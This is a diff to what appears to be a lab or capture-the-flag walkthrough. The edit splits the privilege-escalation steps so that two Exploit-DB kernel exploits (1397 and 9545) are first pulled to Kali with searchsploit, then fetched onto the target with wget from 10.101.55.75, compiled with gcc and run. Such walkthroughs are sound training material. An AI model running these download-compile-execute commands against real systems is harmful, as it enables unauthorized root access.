@@ -315,10 +315,15 @@ Search for a matching kernel exploit on Exploit-DB.
 https://www.exploit-db.com/exploits/1397
 ```
 
-Download and compile the exploit on the target.
+Download it to Kali.
 
 ```
 searchsploit -m 1397
+```
+
+Download and compile the exploit on the target.
+
+```
 wget http://10.101.55.75/1397.c
 gcc -o k-rad3 1397.c -static -O2
 ./k-rad3 -t 1 -p 2
@@ -370,10 +375,15 @@ A second exploit matched the target distribution more closely.
 https://www.exploit-db.com/exploits/9545
 ```
 
-Download and compile it on the target.
+Download it to Kali.
 
 ```
 searchsploit -m 9545
+```
+
+Download and compile it on the target.
+
+```
 wget http://10.101.55.75/9545.c
 gcc -Wall -o linux-sendpage 9545.c
 ./linux-sendpage
